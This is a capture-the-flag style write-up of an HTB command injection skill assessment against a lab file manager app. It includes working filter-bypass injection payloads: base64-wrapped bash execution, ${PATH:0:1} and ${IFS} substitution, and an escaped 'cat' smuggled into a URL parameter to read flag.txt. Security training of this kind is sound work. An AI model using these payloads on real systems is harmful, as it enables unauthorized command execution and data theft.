This is a detailed write-up for the HTB Bug Bounty Hunter Certification’s skill assessments. This write-up series will treat each skill assessment as an individual penetration test, with a full explanation of a specific vulnerability, including remediation recommendations.
Command Injection Skill Assessment

Scenario:
You have been contracted to perform a penetration test for a company, and during your testing, you discover an interesting file manager web application. Since file managers often execute system commands, you are interested in testing for command injection vulnerabilities.

Use the various techniques discussed in this module to detect a command injection vulnerability and then exploit it, bypassing any filters that are in place.

Target in Scope:
94.237.xx.xxx
Recon and Analysis:

First, you want to interact with the application as a normal user to understand its functionality.

The file manager web application appears to be connected to the OS level, allowing us to view files hosted on the server.


When clicking the tmp folder, the parameter in the URL changes to to=tmp.

![1_J-RQt28WxAwk5Wa5-wT5CQ](https://github.com/user-attachments/assets/380f5e5b-af7d-4f72-b085-d875a704f593)

This also happens when visiting a .txt file, with the parameter appearing as to=&view=filename.txt.

https://github.com/user-attachments/assets/380f5e5b-af7d-4f72-b085-d875a704f593

Each file and folder has several functional action buttons, such as the "copy" button.

https://github.com/user-attachments/assets/7d2d989d-c1dc-40cd-80d5-59db260dfaf7

It seems this function allows users to copy files to other directories.

https://github.com/user-attachments/assets/daeecf1b-bf80-4078-a102-71ee641a2e89

The file can be moved using this URL:

http://94.237.49.166:46423/index.php?to=tmp&from=51459716.txt&finish=1&move=1

Once a file is moved, the action cannot be repeated on the same file.

https://github.com/user-attachments/assets/46c09bbc-c89c-4a1c-b950-2270bbf6c6a8

There is also an advanced search option available next to the regular search bar.

https://github.com/user-attachments/assets/80acbefa-01e8-416c-9453-33fc2085bfd4
https://github.com/user-attachments/assets/0983529a-c562-45ef-bbb9-6791d4f1230d
Attack Vector:

After testing the functional areas, we now want to target specific features and URL parameters to see if we can perform a command injection. One such area is the "move file" feature.

Below is the initial move of a file to a directory using the UI and HTTP request.

https://github.com/user-attachments/assets/94daae8f-ce9a-482b-9b92-6fbec09ea931
https://github.com/user-attachments/assets/2d8cddeb-4bb1-4720-a061-6bac9c63af17

Below is the repeated action for moving the same file.

https://github.com/user-attachments/assets/cb117f97-8f43-4e5c-9bf3-dc0b14d97c06
https://github.com/user-attachments/assets/3c20054b-0170-4ff5-a154-528f5eb36ddf

We want to check if the URL parameter is vulnerable to command injection.
Command Injection Techniques:

To inject additional commands into the existing one, we can use the following operators:

https://github.com/user-attachments/assets/8e5a7ced-3d20-453b-9c21-9175d2e7fe26

I tried injecting commands like whoami and ls into the "to" parameter. The error message displayed: "malicious request denied".

https://github.com/user-attachments/assets/1e147d29-cfdb-400e-9811-e61a98f5b7f0
https://github.com/user-attachments/assets/82451731-5b66-4185-b145-1d53d404ac7b

This indicates that basic commands are filtered. Therefore, we need to identify possible filters such as space, blacklisted characters, commands, or WAF filters.

To bypass this, I used command obfuscation with Base64 encoding.

bash<<<$(base64 -d<<<"base64 encoded OS payload")

https://github.com/user-attachments/assets/22448c0a-411a-44c7-8ff2-b9fac3dff2e9
https://github.com/user-attachments/assets/5b6d0267-d673-4229-b934-97ceb20e6007

We successfully executed whoami and obtained the result: www-data. Next, I tested ls -la to list the files.

https://github.com/user-attachments/assets/560881b1-453e-4746-b474-31e947411f67
https://github.com/user-attachments/assets/77d9db20-2325-4098-b28f-4ccd5ff13029
Exploit:

Now that we’ve identified the attack vector by bypassing the filter, we can perform an exploit.

I attempted to view the root directory.

https://github.com/user-attachments/assets/e4370eb5-7f18-490b-a649-145ab6d6e897
https://github.com/user-attachments/assets/cb53bf44-1a46-4127-b883-8a35560f28a5

There are several files, including config.php and index.php. Let’s explore further.

https://github.com/user-attachments/assets/5a87aea9-8c07-4c70-9c76-66608aca0ff1
https://github.com/user-attachments/assets/5bc27cde-d090-4c03-a593-a8dddc535e2d
https://github.com/user-attachments/assets/b144ef9c-9cfb-4b82-b26f-096e92090e35

I couldn’t find the target file, flag.txt, but I moved it to the tmp directory.

${PATH:0:1} = /

${IFS} = space

mv/flag.txt /var/www/html/files/tmp

mv ${PATH:0:1}flag.txt ${PATH:0:1}var${PATH:0:1}www${PATH:0:1}html${PATH:0:1}files${PATH:0:1}tmp

Base64 encoded:

bXYgJHtQQVRIOjA6MX1mbGFnLnR4dCAke1BBVEg6MDoxfXZhciR7UEFUSDowOjF9d3d3JHtQQVRIOjA6MX1odG1sJHtQQVRIOjA6MX1maWxlcyR7UEFUSDowOjF9dG1w

bash<<<$(base64%09-d<<<bXYgJHtQQVRIOjA6MX1mbGFnLnR4dCAke1BBVEg6MDoxfXZhciR7UEFUSDowOjF9d3d3JHtQQVRIOjA6MX1odG1sJHtQQVRIOjA6MX1maWxlcyR7UEFUSDowOjF9dG1w)

https://github.com/user-attachments/assets/ae2ed837-0694-4b6f-8d3e-c9d75efe5024

While the file was moved, I didn’t have permission to read it. However, I now know the location of the flag.txt file.

To bypass character filters, I used this payload:

%26c\a\t%09${PATH:0:1}flag.txt

&cat (horizontal tab) /flag.txt

https://github.com/user-attachments/assets/75d45b6a-43a2-4fba-b380-b1e4c7b0ae99
Consequences:

A command injection vulnerability is one of the most severe types. It allows an attacker to execute OS-level commands on the server, potentially compromising the entire network. When a web application uses user input to execute a system command, an attacker can inject malicious commands and take control of the system.
Remediation:

To prevent command injection vulnerabilities, consider the following measures:

    Avoid using system commands in web applications.
    Implement strict input validation and sanitization.
    Configure the web server properly to minimize the risk of such attacks.
